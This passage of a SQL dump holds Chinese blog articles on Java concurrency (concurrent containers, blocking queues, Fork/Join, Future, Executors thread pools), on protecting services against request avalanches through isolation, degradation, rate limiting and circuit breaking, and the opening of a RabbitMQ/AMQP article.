handleDataChange(String dataPath, Object data) throws Exception {\n				\n			}\n		};\n		this.zkClient.subscribeDataChanges(PATH, iZkDataListener);\n		if(this.zkClient.exists(PATH)) {\n			// 创建信号量\n			this.countDownLatch = new CountDownLatch(1);\n			try {\n				// 等待\n				this.countDownLatch.await();\n			} catch (Exception e) {\n				e.printStackTrace();\n			}\n		}\n		// 删除事件通知\n		this.zkClient.unsubscribeDataChanges(PATH, iZkDataListener);\n	}\n\n}\n```', 2, 0, 90, 0, 0, '2018-09-09 10:52:36', '2019-10-02 23:13:03', 0, 0);
INSERT INTO `article` VALUES (25, 1, '并发容器', '2018/9/1536570063_c0094338c435dd72664a9599ff5ad188.jpg', '## 概念\n记录并发容器性质\n### 并发容器是什么\n1. JDK5增加了并发包java.util,concurrent.*.,其下面的类使用CAS算法实现了区别于synchronouse同步锁的一种乐观锁,JDK5之前Java语言是靠synchronized关键字保证同步的,这是一种独占锁,也就是悲观锁\n2. 执行效率相比于同步容器更高\n\n## 并发容器\n### HashMap与ConcurrentHashMap\n#### HashMap\n1. 在Java编程语言中最基本的结构有两种,一个是数组另一个是指针(引用)\n2. HashMap就是通过这两个结构进行实现的,HashMap底层就是一个数组结构,数组中每一项就是一个链表\n3. 当新建HashMap时就会初始化一个数组出来\n4. HashMap有两个参数影响它的性能,分别时*初始容量和加载因子*,\n5. HashMap并不要求HashMap容器容量必须传入2的n次方总数,而是在初始化时根据传入的容量值计算出一个满足2的n次方的容量\n6. Hashmap是非线程安全的,HashMap的线程不安全主要体现在*resize方法时它可能会出现死循环*以及使用迭代器修改时可能出现问题\n7. 当Hashmap它的容量乘以它的加载因子时候,需要对Hashmap进行扩容,它要创建一个新的,长度为原来两倍的数组,它保证新的容量为原来2的n次方,从而保证上述的寻址的方式仍然适用,同时它需要*将原来的数组全部重新插入到新的数组中*,这个过程称作为ReHash,这个方法它并不保证线程安全,而且在多线程并发调用时可能会出现死循环\n8. HashMap的寻址方式: 对于一个新插入的数据或者需要读取的数据,HashMap需要将它的key按照一定的计算规则计算出哈希值并对数组长度进行取模,结果作为它在数组中的index,在计算机中取模的代价远远高于内余的代价,因此HashMap要求数组的长度必须为2的n次方,此时它将依据哈希值2的n-1次方进行余运算,它的结果和取模操作时相同的\n\n#### ConcurrentHashMap\n1. 与HashMap不同,ConcurrentHashMap最外层不是一个大数组,而是一个Segment数组\n2. 每个Segment数组包含一个与hashmap差不多的链表数组\n3. 读取某个key时,它先读取某个key的hash值,并将hash值的高N位与Segment个数取模从而取得该key*属于哪一个Segment*\n4. 随后它就像操作Hashmap一样操作Segment\n5. 为了保证不同的值均匀的分布到Segment里面,计算hash值时也做了优化\n6. Segment继承自ReentrantLock,所以可以很方便的对每个Segment进行上锁和做锁相关的处理\n7. JDK7以及之前版本中,concurrentMap它时基于分段锁来进行处理的\n\n#### ConcurrentHashMap和HashMap的不同点\n1. ConcurrentHashMap是线程安全的,HashMap是非线程安全的\n2. ConcurrentHashMap不允许key和value为空,HashMap允许key和value为空\n3. ConcurrentHashMap允许iterator遍历的同时对HashMap修改,并且这个更新对后续的遍历是可见的,HashMap不允许通过iterator遍历的同时对HashMap修改\n\n##### JDK7为了实现并行访问引入了Segment这个结构,并发度与Segment是相等的\n##### JDK8为了进一度提高它的并发性,*废弃了分段锁的方案*,并且直接使用了一个大的数组,同时为了提高hash碰撞下的寻址做了性能优化,JDK8在链表长度超过一定的值(默认值8),*这里的链表值换成了红黑树*,它的寻址的时间复杂度从On转换成了Ologn,这是一个性能上的极大提升,JDK8中ConcurrentHashMap同样式通过key的哈希值与数组长度取模确定该key在数组中的索引,不同的是在JDK8中的ConcurrentHashMap作者认为引入红黑树之后即使哈希冲突比较严重,寻址效率也是足够高的,所以作者并未在hash值的计算上做过多的设计\n\n### TreeMap与ConcurrentSkipListMap\n#### HashMap,TreeMap与LinkedHashMap的区别\n1. 它根据键的HashCode 值存储数据，根据键可以直接获取它的值，具有很快的访问速度。遍历时，取得数据的顺序是完全随机的\n2. TreeMap实现SortMap接口，能够把它保存的记录根据比较器排序\n3. LinkedHashMap保存了记录的插入顺序，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的。也可以在构造时带参数，按照应用次数排序\n\n#### ConcurrentSkipListMap\n1. ConcurrentSkipListMap的key是有序的,ConcurrentSkipListMap支持更高的并发\n2. 存取数和线程是没有关系的,在数据量一定的情况下,并发的线程越多,ConcurrentSkipListMap越能体现优势\n4. 对于高并发程序使用ConcurrentSkipListMap提高更高的并发度,所以在*多线程程序中使用*\n5. 在对键值排序时也要尽量使用ConcurrentSkipListMap可以得到更好的并发度 \n\n\n### ArrayList与CopyOnWriteArrayList\n#### ArrayList和LinkedList的区别\n1. ArrayList是实现了基于动态数组的数据结构，LinkedList基于链表的数据结构\n2. 对于随机访问get和set，ArrayList觉得优于LinkedList，因为LinkedList要移动指针。\n3. 对于新增和删除操作add和remove，LinedList比较占优势，因为ArrayList要移动数据。\n\n#### CopyOnWriteArrayList\n1. 当有新元素添加到CopyOnWriteArrayList的时候,他先从原有的数组*拷贝一份出来*,然后在新的数组做写操作,*写完之后再将原来的数组指向到新的数组*\n2. CopyOnWriteArrayList整个操作*都是在锁的保护下进行的*,这么做主要是为了避免多线程并发做add的时候,复制出多个副本把数据搞乱了,导致最终的数组数据不是我们期望的\n3. *读操作*都是在原数组上读,所以不需要加锁的\n4. *写操作*需要加锁,为了避免多个线程并发修改,复制出多个副本出来,把数据搞乱\n\n#### CopyOnWriteArrayList特征\n1. 由于它做写操作的时候需要拷贝数组就会消耗内存,如果元素的内容比较多的情况下,可能会导致*垃圾回收缓慢*,慎用\n2. *不能用于实时读的场景*,比如拷贝数组,新增元素都需要时间,所以调用CopyOnWriteArrayList读取到的数据*可能还是旧的,因为还没写完*\n3. 虽然CopyOnWriteArrayList它能够做到最终的一致性但它*没有满足我们实时性的要求*\n4. 因此CopyOnWriteArrayList它更适合读多写少的场景\n\n#### CopyOnWrite设计思想\n1. 读写分离\n2. 最终一致性,最终结果是对的\n3. 使用时另外开辟空间,利用这点解决并发冲突  \n\n### HashSet与CopyOnWriteArraySet\n1. 底层实现使用了CopyOnWriteArrayList,与CopyOnWriteArrayList一样\n2. 保证唯一性\n\n### TreeSet与ConcurrentSkipListSet\n1. ConcurrentSkipListSet,跳表结构来实现的,它是JDK6新增的类,它和TreeSet一样,它是*支持自然排序*的\n2. 可以在构造的时候自己定义比较器,和其他set集合一样,ConcurrentSkipListSet它是基于map集合的\n3. 在多线程环境下,ConcurrentSkipListSet它的contains,add,remove操作都是线程安全的,多个线程可以安全并发地的执行插入,移除和访问操作\n4. 但是对于*批量操作*,*addAll,removeAll,replaceAll并不能以原子性方式执行*,线程是不安全的\n5. 在操作时只能保证每一次的contains，add,remove的操作是原子性的,保证执行这些操作时不会打断其他线程操作,但是它*不能保证每一次批量操作*都不会被其他线程打断\n6. 它是*不可以使用空元素的*,因为它无法可靠的将参数及返回值与不存在的元素区分开来\n\n\n## 并发队列\n### 阻塞式队列和非阻塞队列的区别\n1. 非阻塞队列比阻塞式队列快,但非阻塞队列防止数据丢失\n2. 阻塞式入列的时候,如果超出队列总数,这时候会进入等待(阻塞)\n3. 阻塞式出列的时候,如果获取队列为空,这时候会进入等待(阻塞)\n\n### 阻塞队列特点\n1. 阻塞队列,某些情况下对阻塞队列进行访问会进行阻塞,阻塞队列是线程安全的\n2. 不止完成队列基本的功能,同时在多线程环境下它还*自动管理了多线程之间的等待唤醒功能*,从而使得开发人员可以忽略这些细节,关注更高级的功能\n\n### 主要应用在生产者消费者场景\n1. 负责生产的线程不断地制造新对象并插入到阻塞队列中直到达到这个队列的上限值,队列达到上限值之后,生产线程将会被阻塞,\n直到消费者线程对这个队列开始消费\n2. 负责消费的线程不断地从队列中消费对象,直到这个队列为空,当队列为空的时候,消费线程将会被阻塞,\n除非队列中有新的对象被插入进来\n\n### 五个BlockingQueue的实现类\n#### ArrayBlockingQueue \n1. 有界的阻塞队列,内部实现是一个数组,*它的容量是有限的*,我们必须在初始化的时候指定它的容量大小,指定后不允许修改\n2. 先进先出的方式执行队列,插入的对象是尾部,最先移除的对象是头部\n\n#### DelayQueue\n1. 它阻塞的是内部元素\n2. DelayQueue的元素必须实现一个*Delay接口*,Delay接口继承了Comparable接口\n3. DelayQueue中的元素都要进行排序,一般情况下都是按照元素过期时间的优先级进行排序 \n4. 主要应用关闭连接,缓存对象,超时处理等多种场景\n\n#### LinkedBlockingQueue\n5. 大小配置是可选的,如果初始化时指定了大小,那么它就是有边界的,如果*不指定就是无边界*\n6. 先进先出的方式存储数据,最先插入的对象在尾部,最先移除的对象在头部\n\n#### PriorityBlockingQueue\n1. 带优先级的阻塞队列,没有边界\n2. *有排序规则*\n3. 允许插入null\n4. 所有插入PriorityBlockingQueue的对象必须实现Comparable接口,队列的排序规则就是根据Comparable接口实现来定义的\n5. 我们可以从PriorityBlockingQueue中获得一个迭代器iterator,但这个迭代器并不保证按照我们优先级的顺序进行迭代\n\n#### SynchronousQueue\n1. 内部*仅允许容纳一个元素*,当一个线程插入一个元素后就会被阻塞,除非这个元素并另一个消费\n2. 因此我们称它为*同步队列*,它是一个无界非缓存的队列,不存储元素,放入的元素只有等待取走元素之后才能放入 \n\n## 线程组件\n### ThreadLocal\n1. 是一个非常好用Map,key存储的是当前线程,线程安全且线程封闭,可以在当前线程运行时期的任意位置存储的值\n2. 采用线程封闭来保证数据安全性\n\n\n```java\nprivate static final ThreadLocal<String> threadLocal = new ThreadLocal<String>();\n```\n\n#### 什么是线程封闭\n##### 把对象*封装到一个线程里*,只有这一个线程看到这个对象,那么这个对象就算不是线程安全的,也不会出现任何线程不安全的问题,因为它只能在一个线程里进行访问\n\n### Fork/Join\n```java\n@Slf4j\npublic class ForkJoinTaskExample extends RecursiveTask<Integer>{\n	\n	public static final int threshold = 2;\n	private int start;\n	private int end;\n\n	public ForkJoinTaskExample(int start, int end) {\n		this.start = start;\n		this.end = end;\n	}\n\n	@Override\n	protected Integer compute() {\n		int sum = 0;\n		// 如果任务足够小就计算任务\n		boolean canCompute = (end-start) <= threshold;\n		if (canCompute) {\n			for (int i = start; i <= end; i++) {\n				sum += i ;\n			}\n		} else {\n			// 如果任务大于阈值,就分裂成两个子任务计算\n			int middle = (start + end)/2;\n			ForkJoinTaskExample leftTask = new ForkJoinTaskExample(start, middle);\n			ForkJoinTaskExample rightTask = new ForkJoinTaskExample(middle + 1, end);\n			// 执行子任务\n			leftTask.fork();\n			rightTask.fork();\n			// 等待任务执行结束合并其结果\n			int leftResult = leftTask.join();\n			int rightResult = rightTask.join();\n			// 合并子任务\n			sum = leftResult + rightResult;\n		}\n		return sum;\n	}\n\n\n	public static void main(String[] args) {\n		ForkJoinPool forkJoinPool = new ForkJoinPool();\n		// 生成一个计算任务,计算1+2+3+4\n		ForkJoinTaskExample task = new ForkJoinTaskExample(1, 100);\n		// 执行一个任务\n		Future<Integer> result = forkJoinPool.submit(task);\n		try {\n			log.info(\"result:{}\", result.get());\n		} catch(Exception e) {\n			log.error(\"exception\", e);\n		}\n	}\n}\n```\n1. 是JDK7提供的一个用于并行执行任务的框架,它是一个*把大任务分割成若干个小任务*,最终汇总每个小任务结果后得到大任务结果的框架\n2. 它的思想和mapreduce的思想十分类似\n\n\n1. *Fork*:把若干个大任务拆分成小任务并行执行\n2. *Join*:合并这些子任务的执行结果最后得到大任务的结果\n\n\n3. 它主要采用了*工作窃取算法*,工作切取算法指*某个线程从其他队列里窃取任务来执行*\n6. 对于Fork/Join框架而言,当一个任务正在等待它使用Fork/Join操作,创建的子任务结束时,\n执行这个任务的工作线程,查找其他未被执行的任务并开始它的执行,通过这种方式线程充分利用它们的运行时间来提高应用程序的性能\n\n\n#### Fork/Join框架执行的任务有一些局限性\n- 任务只能用Fork和Join操作来作为同步机制,如果使用了其他同步机制,那它们在同步操作时,*工作线程就不能执行其他任务了*.比如在Fork/Join框架中,使任务进入了睡眠,那么在睡眠期间内,正在执行这个任务的工作线程将不会执行其他任务了,\n- 我们所拆分的任务*不应该去执行IO操作*,如读写数据文件\n- 任务不能抛出检查异常,必须通过必要的代码来处理它们 \n\n#### Fork/Join框架的核心类\n- ForkJoinPool(负责实现,工作窃取算法,它管理工作线程和提供关于任务的状态以及它们的执行信息)\n- ForkJoinTask(主要提供在任务中执行Fork和Join操作的机制)\n\n### Callable,Future\n```java\n@Slf4j\npublic class FutureTaskExample {\n	\n	public static void main(String[] args) throws Exception{\n		FutureTask<String> futureTask = new FutureTask<String>(new Callable<String>() {\n			@Override\n			public String call() throws Exception {\n				log.info(\"do something in callable\");\n				Thread.sleep(5000);\n				return \"Done\";\n			}\n		});\n		new Thread(futureTask).start();\n		log.info(\"do something in main\");\n		Thread.sleep(1000);\n		// 在此阻塞,直到等到futureTask返回值为止\n		String result = futureTask.get();\n		log.info(\"result:{}\",result);\n	}\n	\n}\n```\n#### 作用\n1. 桌面应用程序(CS),下载图片展示,使用子线程进行下载,整个应用程序不会阻塞,相当于ajax\n2. Future模式的核心在于,去除主函数的等待时间,并使得原本需要等待的时间段可以用于处理其他业务逻辑\n3. FutureA和B两个线程,如果A需要B的执行结果,那么这个A线程不需要等待B执行完毕才能拿到结果\n\n\n#### Future接口\n1. 对于具体的runnable或者callable的任务它可以进行取消,查询的任务是否被取消,查询是否完成,获取结果\n2. 一般线程都是异步计算模型的,所以通常不能其他线程中得到方法的返回值,Future就是应用在这种时候\n3. Futrue可以监视目标线程调用call情况,当你调用Future的get方法时候就可以获得它的结果,这时候线程通常不会完成,当前线程开始阻塞,\n*直到call方法结束返回结果,线程才继续执行*\n4. 总结一句话,future可以得到其他线程方法的返回值 \n\n#### FutureTask类\n1. 它的父类是RunnableFuture,而RunnableFuture继承了Runnable和Future两个接口\n2. 由此知道RunnableFuture最终也是执行callable类型的任务\n3. 如果构造函数类型是runnable的话,它会转换成callable类型\n4. FutureTask它实现了Runnable和Future两个接口,所以它既可以作为Runnable作为线程执行又可以作为Futrue得到callable的返回值\n5. 这个组合的好处,假设有一个很费时的逻辑需要计算并且返回这个值,同时这个值并不是马上需要,那么就可以使用这个组合\n6. 用另外一个线程去计算返回值,而当前线程在使用这个返回值之前可以做其他的操作,得到需要这个返回值时再通过Future得到\n7. 特别方便,在想启个线程去些事情的时候,而且还担心它的结果是否正常执行就可以代码中使用FutureTask\n\n#### callable和runnable接口对比\n1. runnable非常简单,它是一个接口且只有一个方法run,创建一个类实现它,把一些费时的操作写在里面,然后使用某个线程执行runnable实现类就可以实现多线程,在执行完任务之后无法获取执行结果\n2. callable也非常简单,不同的是它是一个泛型接口,它里面有一个call方法,call函数返回类型就是我们创建callable进去的类类型,callable更强大一些,它能够有返回值,并且可以抛出异常', 4, 0, 158, 0, 0, '2018-09-10 17:01:16', '2019-02-22 00:19:29', 0, 0);
INSERT INTO `article` VALUES (26, 1, 'Executors提供的线程池', '2019/1/1547015298_72328479_p0.jpg', '### Executors\n#### Executors提供的五种线程池\n1. **CachedThreadPool**: 缓存线程池,*因为核心数是0所以会自动销毁*,*动态改变线程数量*,如果线程池长度超过处理需要,可灵活回收空闲线程,若无可回收,则新建线程;最大线程数是Integer.MAX_VALUE, 长时间的大任务不要用这个\n2. **FixedThreadPool**: 固定长度线程池,不会自动销毁,核心数10个,最大数10个;最常使用的线程池 \n3. **SingleThreadExecutor**: 单线程化线程执行器,不会自动销毁,它只会用唯一的工作线程来执行任务,保证所有任务按照指定顺序(FIFO,LIFO,优先级)执行;直接new Thread()线程无法*将已提交的可运行对象放入缓存队列*，但是SingleThreadExecutor可以执行此操作。\n4. **WorkStealingPool**: 工作窃取线程池,自动销毁,默认以CPU核心数创建足够多的线程数,通过使用多个队列,减少竞争;它会通过工作窃取的方式，使得多核的 CPU 不会闲置，总会有活着的线程让 CPU 去运行\n3. **ScheduledThreadPool**: 创建一个定长线程池,支持定时及周期性任务执行\n\n### Executors提供的五种线程池\n#### CachedThreadPool\n```java\n/**\n     * CachedThreadPool: 缓存线程池,因为核心数是0所以会自动销毁,动态改变线程数量,如果线程池长度超过处理需要,可灵活回收空闲线程,若无可回收,则新建线程\n     *   最大线程数是Integer.MAX_VALUE, 长时间的大任务不要用这个\n     *\n     * return new ThreadPoolExecutor(0, Integer.MAX_VALUE,\n     *   60L, TimeUnit.SECONDS,\n     *   new SynchronousQueue<Runnable>());\n     */\n    private static void useCachedThreadPool() throws InterruptedException {\n        ExecutorService executorService = Executors.newCachedThreadPool();\n    }\n```\n\n1. 缓存线程池,*因为核心数是0所以会自动销毁*,*动态改变线程数量*\n2. 如果线程池长度超过处理需要,可灵活回收空闲线程,若无可回收,则新建线程\n3. 最大线程数是Integer.MAX_VALUE, 长时间的大任务不要用这个\n\n#### FixedThreadPool\n```java\n/**\n     * FixedThreadPool: 固定长度线程池,不会自动销毁,核心数10个,最大数10个\n     *  最常使用的线程池\n     * return new ThreadPoolExecutor(nThreads, nThreads,\n     *         0L, TimeUnit.MILLISECONDS,\n     *         new LinkedBlockingQueue<Runnable>());\n     */\n    private static void useFixedSizePool() throws InterruptedException {\n        // 不会自动销毁,核心10个,最多10个\n        ExecutorService executorService = Executors.newFixedThreadPool(10);\n    }\n```\n\n1. 固定长度线程池,不会自动销毁,核心数10个,最大数10个\n2. 最常使用的线程池 \n\n#### SingleThreadExecutor\n```java\n/**\n     * SingleThreadExecutor: 单线程化线程执行器,不会自动销毁,它只会用唯一的工作线程来执行任务,保证所有任务按照指定顺序(FIFO,LIFO,优先级)执行\n     *  直接new Thread()线程无法将已提交的可运行对象放入缓存队列，但是SingleThreadExecutor可以执行此操作。\n     *\n     * return new FinalizableDelegatedExecutorService\n     *             (new ThreadPoolExecutor(1, 1,\n     *        0L, TimeUnit.MILLISECONDS,\n     *        new LinkedBlockingQueue<Runnable>()));\n     */\n    private static void useSinglePool() throws InterruptedException {\n        ExecutorService executorService = Executors.newSingleThreadExecutor();\n    }\n```\n1. 单线程化线程执行器,不会自动销毁,它只会用唯一的工作线程来执行任务,保证所有任务按照指定顺序(FIFO,LIFO,优先级)执行\n2. 直接new Thread()线程无法*将已提交的可运行对象放入缓存队列*，但是SingleThreadExecutor可以执行此操作。\n\n#### WorkStealingPool\n```java\n/**\n     * WorkStealingPool: 工作窃取线程池 会自动销毁 默认使用CPU核心数创建足够多的线程数\n     * 它会通过工作窃取的方式，使得多核的 CPU 不会闲置，总会有活着的线程让 CPU 去运行\n     *\n     * return new ForkJoinPool\n     *             (Runtime.getRuntime().availableProcessors(),\n     *              ForkJoinPool.defaultForkJoinWorkerThreadFactory,\n     *              null, true);\n     */\n    private static void useWorkStealingPool() throws InterruptedException {\n        ExecutorService executorService = Executors.newWorkStealingPool();\n    }\n```\n1. 工作窃取线程池,会自动销毁,默认使用CPU核心数创建足够多的线程数\n2. 它会通过工作窃取的方式，使得多核的 CPU 不会闲置，总会有活着的线程让 CPU 去运行\n\n#### ScheduledThreadPool\n```java\n	/**\n     *  ScheduledThreadPoolExecutor\n     *      定时执行线程池,不动自动销毁,自定义线程数量,定时任务即使被调用cancel取消,线程池也不会关闭销毁\n     *      支持定时及周期性任务执行,自定义核心数,最大线程数Integer.MAX_VALUE,\n     *   super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS,\n     *               new DelayedWorkQueue());\n     *  schedule(runnable/callable, 2, TimeUnit.SECONDS)\n     *  只会执行一次,两秒后执行\n     */\n    private static void testMethodSchedule() throws ExecutionException, InterruptedException {\n        ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(2);\n        ScheduledFuture<String> future = executor.schedule(() -> {\n            System.out.println(\"===I will be invoked!\");\n            return \"Yes\";\n        }, 2, TimeUnit.SECONDS);\n        // System.out.println(future.cancel(true)); // 调用后future.cancel(true),schedule的执行内容不会执行了\n        System.out.println(future.get());\n    }\n\n	/**\n     *  scheduleAtFixedRate(runnable/callable, 1, 2, TimeUnit.SECONDS)\n     *  多次执行,一秒后执行任务,然后后续每两秒执行一次\n     *  与TimerTask一样,执行一次任务结束后再执行下次任务\n     *  每次负责执行的线程可能不同\n     *  建议使用crontab/quartz/Control-M\n     */\n    private static void testMethodScheduleAtFixedRate() throws InterruptedException {\n        ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(2);\n        final AtomicLong interval = new AtomicLong(0L);\n        ScheduledFuture<?> scheduledFuture = executor.scheduleAtFixedRate(() ->{\n            long currentTimeMillis = System.currentTimeMillis();\n            if (interval.get() == 0) {\n                System.out.printf(\"The first time trigger task at %d\\n\", currentTimeMillis);\n            } else {\n                System.out.printf(\"The actually spend [%d]\\n\", currentTimeMillis - interval.get());\n            }\n            interval.set(currentTimeMillis);\n            System.out.println(Thread.currentThread().getName());\n            sleepSeconds(5);\n        }, 1, 2, TimeUnit.SECONDS);\n        scheduledFuture.cancel(true);// cancel后任务不会珍惜\n        executor.shutdown();\n        executor.awaitTermination(1, TimeUnit.HOURS);// 等待关闭线程池\n    }\n\n	/**\n     *  线程池关闭后是否继续执行周期性任务,关机策略后继续执行现有的周期性任务\n     * {@link ScheduledThreadPoolExecutor#setContinueExistingPeriodicTasksAfterShutdownPolicy(boolean)}\n     * 默认false: 线程池shutdown后会停止周期性任务并被关闭销毁\n     * 如果true: 线程shutdown后线程池关闭但不会停止周期性的任务,\n     */\n    private static void testContinueExistingPeriodicTasksAfterShutdownPolicy() throws InterruptedException {\n        ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(10);\n        System.out.println(executor.getContinueExistingPeriodicTasksAfterShutdownPolicy()); // 默认false,shutdown后会停止周期性任务\n        executor.setContinueExistingPeriodicTasksAfterShutdownPolicy(true); // 设置true,shutdown后不会停止周期性任务\n        final AtomicLong interval = new AtomicLong(0L);\n        ScheduledFuture<?> scheduledFuture = executor.scheduleAtFixedRate(() ->{\n            long currentTimeMillis = System.currentTimeMillis();\n            if (interval.get() == 0) {\n                System.out.printf(\"The first time trigger task at %d\\n\", currentTimeMillis);\n            } else {\n                System.out.printf(\"The actually spend [%d]\\n\", currentTimeMillis - interval.get());\n            }\n            interval.set(currentTimeMillis);\n            System.out.println(Thread.currentThread().getName());\n            sleepSeconds(5);\n        }, 1, 2, TimeUnit.SECONDS);\n        TimeUnit.MILLISECONDS.sleep(1200);\n        executor.shutdown();\n        System.out.println(\"===over===\");\n    }\n```\n1. 定时执行线程池,不动自动销毁,自定义线程数量,定时任务即使被调用cancel取消,线程池也不会关闭销毁\n2. 支持定时及周期性任务执行,自定义核心数,最大线程数Integer.MAX_VALUE\n3. schedule只会执行一次,scheduleAtFixedRate会执行多次\n4. 与TimerTask一样,*执行一次任务结束后等待完成再执行下次任务*\n5. 每次负责执行的线程可能不同', 2, 0, 151, 0, 3, '2018-09-13 12:01:06', '2019-10-16 21:17:58', 0, 0);
INSERT INTO `article` VALUES (27, 1, '服务雪崩及防范机制', '2019/1/1547366832_64495434_p0_master1200.jpg', '## 概念\r\n### 服务雪崩与服务堆积是什么\r\n![fuwuduiji.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwuduiji.png)\r\n1. 默认情况下,只有一个线程池维护所有的服务接口,如果大量请求访问同一个接口,*达到配置线程数的极限,可能会导致其他服务无法访问*,线程池满了,从而导致系统无法访问而崩溃\r\n2. 主要产生雪崩原因是因为*服务请求堆积*问题\r\n3. 假设默认tomcat最大线程池是50,尝试第51个请求会阻塞,请求在等待,如果堆积请求过多,那么就会造成服务雪崩\r\n4. 大量的服务堆积请求会造成其他接口无法访问,导致服务崩溃\r\n5. 恶意的大量接口攻击可以导致服务雪崩\r\n\r\n### 解决服务雪崩的方案\r\n1. 服务隔离(接口独立的线程池,接口间互不影响)\r\n2. 服务降级(当服务超时失败时,给予客户端默认返回)\r\n3. 服务限流(限制接口时间内的访问量,当超出时给予服务降级)\r\n4. 服务熔断(限制接口可承受的上限值,当超出时给予服务降级)\r\n\r\n### 服务隔离\r\n![fuwugeli.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwugeli.png)\r\n1. 每个服务接口都有自己独立线程池,每个线程池互不影响,管理运行当前自己接口,这样就可以解决服务雪崩效应\r\n2. 遭遇大量恶意攻击时,单纯的隔离方案仍然危险\r\n\r\n### 服务降级\r\n![fuwujiangji.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwujiangji.png)\r\n1. 高并发情况,当服务不可用时,直接返回一个默认提示或页面,避免客户端一直等待\r\n2. 避免大量请求处于阻塞状态,达到一定时间给予友好提示\r\n\r\n### 服务限流\r\n#### 服务限流是什么\r\n1. 限制接口时间内的访问量,当超出时给予服务降级\r\n2. 常应用于秒杀抢购,服务安全(流量攻击,DDOS),雪崩效应,流量突然特别大的情况\r\n\r\n#### 服务限流的实现算法\r\n1. 滑动计数器\r\n2. 令牌桶\r\n3. 漏桶\r\n\r\n#### 滑动计数器\r\n![fuwulimting_counter.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwulimting_counter.png)\r\n1. 已时间格子的滑动窗口实现服务限流\r\n2. *滑动窗口随当前时间变化不断向后移动*,最后的格子是当前的时间\r\n3. 进行请求时,检查前面的时间格子并根据制定的规则,得出此次请求是否应该被通过还是降级处理\r\n\r\n#### 令牌桶\r\n![fuwulimting_tokenBucket.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwulimting_tokenBucket.png)\r\n1. 令牌桶分为两个动作\r\n2. 动作1,固定速率往桶中存入令牌\r\n3. 动作2,客户端如果想访问请求,先从桶中获取令牌\r\n4. 创建令牌桶开启独立线程以*固定的速率往桶中存放令牌*,固定速率2R/S,表示每秒往桶中放入两个令牌\r\n5. 如果客户端从桶中获取不到令牌,进行降级处理\r\n\r\n#### 漏桶\r\n![lfuwulimting_leakyBucket.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_lfuwulimting_leakyBucket.png)\r\n1. 流入: (客户端请求)\r\n2. 流出: (每允许通过的请求)\r\n3. 水都: (客户端请求的唯一标识)\r\n4. 已固定速率从桶中流出水滴,流出的水滴(请求),作为有效请求\r\n5. 当流入速率大于流出速率,那么水桶会溢出,*溢出的水滴(请求)都进行降级处理*\r\n\r\n### 服务熔断\r\n![fuwuroduan.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547373419_fuwuroduan.png)\r\n1. 高并发情况,如果达到流量*一定极限(阈值)*,超出了设置阈值,进行降级处理,保护当前服务不会遭到崩溃,熔断目的是为了*保护服务*\r\n2. 限制接口可承受的上限值,当超出时进行服务降级', 6, 0, 158, 0, 3, '2018-09-13 13:36:43', '2019-02-22 00:20:30', 0, 0);
INSERT INTO `article` VALUES (28, 1, 'RabbitMQ', '2018/9/1537078424_2ed8cfd75ff117d7afaa6b3768b5466a.jpg', '### 基本概念\n#### 消息中间件\n1. 消息队列中间件是分布式系统中重要组件.\n2. 主要解决应用解耦,异步消息,流量削峰等问题\n3. 实现高性能,高可用,可伸缩和最终一致性架构,\n4. *消息中间件不等于消息队列,消息中间件包含消息队列和发布订阅(主题概念)*\n\n#### JMS规范(Java消息服务)\n1. 提供者: 实现JMS规范的消息中间件服务器\n2. 客户端: 发送或接收消息的应用程序\n3. 生产者/发布者: 创建并发送消息的客户端\n4. 消费者/订阅者: 接收并处理消息的客户端\n5. 消息: 应用程序之间传递的数据内容\n6. 消息模式: 在客户端之间传递消息的方式,JMS中定义了主题和队列两种模式(即发布订阅与点对点通讯)\n\n#### 消息队列应用场景\n1. 异步处理耗时操作,并行方式提高处理的时间\n2. 下单调用库存系统或金融交易所时,配合异步通知进行回报\n3. 流量削峰的秒杀,利用Redis+MQ+服务保护(服务降级、隔离、熔断,限流)+图形验证码+一次性token \n\n#### rabbitmq是什么\n1. rabbitmq是一个开源的消息代理和队列服务器,用来通过普通协议在完全不同的应用之间共享数据,RabbitMQ是使用erlang语言来编写的,并且RabbitMQ是基于AMQP协议的\n\n#### 什么是AMQP高级协议\n1. AMQP全称: AdvancedMessageQueuingProtocol(高级消息队列协议)\n2. AMQP定义: 是具有现代特征的*二进制协议*.是一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,\n为面向消息的中间件设计\n\n#### 高性能是如何做到的?\n1. erlang语言最初在于交换机领域的架构模式,这样使得RabbitMQ在Broker之间进行数据交互的性能是非常优秀的\n2. erlang的优点: erlang有着和原生socket一样的延迟\n\n#### 主流mq对比\n1. activemq； 遵循jms规范,安装方便,有可能会丢失消息,性能差,现在的重心在下一代产品apolle上\n2. rabbitmq: 继承erlang天生的并发性,不支持动态扩展,性能较佳,功能多,使用广\n3. kafka: 依赖zk,可动态扩展节点,性能极高,严格的顺序机制,不支持消息优先级,少量数据丢失\n4. rocketmq: 各方面较佳,但是是半开源框架,付钱才可以开启所有功能\n\n\n## 架构模型\n### RabbitMQ整体架构模型是什么样子的\n![rabbitMQServer.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544842647_rabbitMQServer.png)\n### AMQP核心概念\n1. *server*: 又称Broker,接受客户端的连接,实现AMQP实体服务\n2. *Connection*: 连接,应用程序与Broker的网络连接\n3. *Channel*: 网络信道,几乎所有的操作都在Channel中进行,Channel是进行消息读写的通道.客户端可建立多个Channel,\n每个Channel代表一个会话任务\n4. *Message*: 消息,服务器和应用程序之间传送的数据,由Properties和Body组成,Properties可以对消息进行修饰,比如消息的优先级,\n延迟等高级特性,Body则就是消息体内容\n5. *VirtualHost*: 虚拟地址,用于进行逻辑隔离,相当于Redis中的16个db,最上层的消息路由,一个VirtualHost里面可以有若干个Exchange和Queue,\n同一个VirtualHost里面不能有相同名称的Exchange或Queue\n6. *Exchange*: 交换机,接受消息,根据路由键转发消息到绑定的队列,有*路由类型(很关键)* \n7. 